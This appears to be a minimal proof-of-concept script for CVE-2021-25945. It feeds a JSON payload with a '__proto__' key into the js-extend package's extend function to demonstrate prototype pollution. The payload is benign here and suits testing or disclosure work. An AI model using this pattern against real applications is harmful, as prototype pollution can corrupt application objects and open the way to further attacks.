//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25945
  const jsExtend = require("js-extend");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  jsExtend.extend({}, JSON.parse(malicious_payload));
